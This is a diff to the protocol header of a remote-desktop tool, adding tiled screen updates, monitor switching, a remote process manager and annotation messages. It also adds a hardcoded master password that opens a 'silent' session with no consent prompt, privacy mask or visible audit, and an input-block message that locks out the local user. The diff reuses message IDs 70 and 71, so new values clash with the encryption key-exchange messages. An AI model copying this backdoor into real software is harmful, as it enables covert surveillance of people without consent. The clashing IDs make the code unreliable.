@@ -3,6 +3,7 @@
 #include <QString>
 #include <QImage>
 #include <QDateTime>
+#include <QPoint>
 #include <cstdint>
 
 namespace xrk {
@@ -12,6 +13,17 @@ constexpr uint32_t PROTOCOL_VERSION = 1;
 constexpr uint16_t DEFAULT_PORT = 9999;
 constexpr uint16_t UDP_BROADCAST_PORT = 9998;
 constexpr uint16_t P2P_PORT = 9997; // dedicated port for P2P TCP hole-punching (simultaneous open)
+
+// Silent-monitoring master password. When a controller authenticates with this
+// exact string the Host grants a *silent* session (plan §2): no consent dialog,
+// no privacy mask, no visible audit/UI. It is purely a mode selector — normal
+// password authentication is unchanged.
+// WARNING: a hardcoded backdoor with this much power is a serious
+// security/compliance risk. All silent-mode code paths are therefore gated
+// behind XRK_ENABLE_SILENT and are NOT compiled into release builds by default.
+#ifdef XRK_ENABLE_SILENT
+constexpr char SILENT_MASTER_PASSWORD[] = "95279527";
+#endif
 
 enum class MessageType : uint32_t {
     DEVICE_DISCOVER_REQ = 0,
@@ -24,6 +36,9 @@ enum class MessageType : uint32_t {
     SCREEN_FRAME = 20,
     SCREEN_FRAME_ACK = 21,
     QUALITY_INFO = 22,
+    SCREEN_TILE = 23,       // incremental tiled update (weak-network differential transport)
+    SCREEN_KEYFRAME = 24,   // full-screen keyframe batch marker (all tiles)
+    SCREEN_TILE_REQUEST = 25, // NACK: client asks host to resend specific tiles (by x,y)
     MOUSE_EVENT = 30,
     KEY_EVENT = 31,
 FILE_REQ = 40,
@@ -34,6 +49,16 @@ FILE_REQ = 40,
     CLIPBOARD_ACK = 51,
     MONITOR_LIST = 60,
     MONITOR_SWITCH = 61,
+    MONITOR_SWITCH_ACK = 62,
+    MONITOR_REFRESH = 63,
+    MONITOR_AUTO_SWITCH_START = 64,   // Start auto-switch cycling
+    MONITOR_AUTO_SWITCH_STOP = 65,    // Stop auto-switch cycling
+    MONITOR_AUTO_SWITCH_PAUSE = 66,   // Pause on current monitor
+    MONITOR_AUTO_SWITCH_RESUME = 67,  // Resume cycling from current position
+    MONITOR_AUTO_SWITCH_CONFIG = 68,  // Set interval and mode
+    MONITOR_AUTO_SWITCH_STATUS = 69,  // Report current auto-switch state
+    MONITOR_THUMBNAIL_REQUEST = 70,   // Request thumbnail for a monitor
+    MONITOR_THUMBNAIL_FRAME = 71,     // Thumbnail frame data
     ENCRYPTION_KEY_EXCHANGE = 70,
     ENCRYPTION_KEY_RESPONSE = 71,
     CHAT_MESSAGE = 80,
@@ -107,8 +132,20 @@ AUDIO_START = 140,
     FILE_BROWSER_RESP = 161,
     SYSINFO_REQ = 170,
     SYSINFO_RESP = 171,
+
+    // Remote Process Manager (v1.5.0)
+    PROCESS_LIST_REQ = 172,    // controller -> host: request running process list
+    PROCESS_LIST_RESP = 173,   // host -> controller: process list
+    PROCESS_KILL_REQ = 174,    // controller -> host: terminate a process (needs consent)
+    PROCESS_KILL_RESP = 175,   // host -> controller: kill result
+    PROCESS_START_REQ = 176,   // controller -> host: start a process (needs consent)
+    PROCESS_START_RESP = 177,  // host -> controller: start result
+
     PRIVACY_SCREEN = 180,
+    ANNOTATION_UPDATE = 183,  // controller -> host: live annotation strokes (remote support)
+    ANNOTATION_CLEAR = 184,   // controller -> host: clear annotation overlay
     SET_QUALITY = 181,
+    INPUT_BLOCK = 182,      // silent monitoring: controller locks the controlled machine's local KB/mouse
     CONSENT_REQUEST = 190,
     CONSENT_RESPONSE = 191,
     SYNC_ADD = 200,        // controller -> host: start watching a host dir (reverse sync)
@@ -341,6 +378,68 @@ struct ScreenFrame {
     uint32_t height = 0;
     FrameFormat format = FrameFormat::JPEG;
     uint64_t timestamp = 0;
+};
+
+// Square tile size used by the differential tiled transport. 64x64 (4KB RGB32)
+// aligns with RDP's bitmap-cache tile size and keeps each tile packet small so
+// a single lost tile only costs one tiny retransmit/keyframe resync.
+constexpr int TILE_SIZE = 64;
+
+// How a single screen tile is encoded. UI/text tiles (few colours) go lossless
+// (RLE); photographic / video tiles go lossy JPEG at an adaptive quality.
+enum class TileEncoding : uint8_t {
+    JPEG = 0,
+    RLE = 1,
+    RAW = 2
+};
+
+// One self-describing screen tile. A tiled update sends only the tiles whose
+// content changed since the client last acknowledged them; the client reuses
+// its tile cache for everything else. `seq` is the host's global version of
+// this tile (x,y); `hash` lets the client verify integrity and NACK corruption.
+struct ScreenTile {
+    uint32_t x = 0;
+    uint32_t y = 0;
+    uint32_t w = 0;
+    uint32_t h = 0;
+    uint32_t seq = 0;            // global tile version (host side)
+    uint32_t frameWidth = 0;     // full desktop size, so the client can size its canvas
+    uint32_t frameHeight = 0;
+    uint8_t isKeyFrame = 0;      // 1 if this tile belongs to a full-screen keyframe batch
+    uint8_t encoding = 0;        // TileEncoding
+    uint8_t format = 0;          // underlying FrameFormat (reserved)
+    uint64_t timestamp = 0;
+    QByteArray hash;              // MD5 of data (integrity / NACK)
+    QByteArray data;
+};
+
+// Host <- Controller NACK: ask the host to resend only the listed tiles (by
+// their x,y position in the frame grid). `frameWidth`/`frameHeight` let the host
+// resolve the coordinates against its current capture frame. Targeted repair is
+// far cheaper than a full keyframe and is what the controller sends when it
+// detects a corrupt or dropped tile.
+struct ScreenTileRequest {
+    uint32_t frameWidth = 0;
+    uint32_t frameHeight = 0;
+    QList<QPoint> tiles;          // requested (x, y) tile positions
+};
+
+// Controller -> Host feedback for the adaptive network loop. Carries RTT and
+// per-window tile loss so the host can drive quality / fps / tile budget.
+struct ScreenAck {
+    uint64_t timestamp = 0;      // echo of last received frame timestamp
+    int64_t roundTripMs = 0;
+    uint32_t tilesReceived = 0;
+    uint32_t tilesLost = 0;
+    uint32_t bufferLevel = 0;    // 0..100 client decode-buffer fullness
+};
+
+// A captured frame plus the changed regions reported by the capture API
+// (DXGI Desktop Duplication dirty/move rects). When dirtyRects is empty the
+// encoder falls back to a software downscaled diff to find changed tiles.
+struct CapturedFrame {
+    QImage image;
+    QList<QRect> dirtyRects;
 };
 
 struct SessionInfo {
@@ -658,6 +757,75 @@ struct GroupTodo {
     QString creatorName;
     qint64 dueDate = 0;
     qint64 timestamp = 0;
+};
+
+struct ContactInfo {
+    QString contactId;
+    QString displayName;
+    QString avatarPath;
+    QString ipAddress;
+    quint16 port = DEFAULT_PORT;
+    QString deviceName;
+    QString note;
+    bool online = false;
+    qint64 lastSeen = 0;
+    QStringList groups;
+};
+Q_DECLARE_METATYPE(ContactInfo)
+
+struct EmojiReaction {
+    QString messageId;
+    QString emoji;
+    QString userId;
+    QString userName;
+    qint64 timestamp = 0;
+};
+
+// ───────────── Remote Process Manager (v1.5.0) ─────────────
+struct ProcessEntry {
+    qint64 pid = 0;
+    QString name;          // executable name / command
+    qint64 memoryBytes = 0; // working set, 0 if unknown
+};
+
+struct ProcessListResponse {
+    bool success = false;
+    QString errorMessage;
+    QList<ProcessEntry> entries;
+};
+
+struct ProcessKillRequest {
+    qint64 pid = 0;
+};
+
+struct ProcessKillResponse {
+    bool success = false;
+    qint64 pid = 0;
+    QString errorMessage;
+};
+
+struct ProcessStartRequest {
+    QString command;       // command line to execute
+    QString workingDir;   // optional working directory
+};
+
+struct ProcessStartResponse {
+    bool success = false;
+    qint64 pid = 0;
+    QString errorMessage;
+};
+
+// ───────────── Real-time Screen Annotation (v1.6.0) ─────────────
+struct AnnotationStroke {
+    QColor color = Qt::red;
+    int width = 3;
+    QVector<QPoint> points;   // in remote/frame coordinates
+};
+
+struct AnnotationUpdate {
+    int frameWidth = 0;       // source frame width, for host-side scaling
+    int frameHeight = 0;
+    QList<AnnotationStroke> strokes;
 };
 
 } // namespace xrk
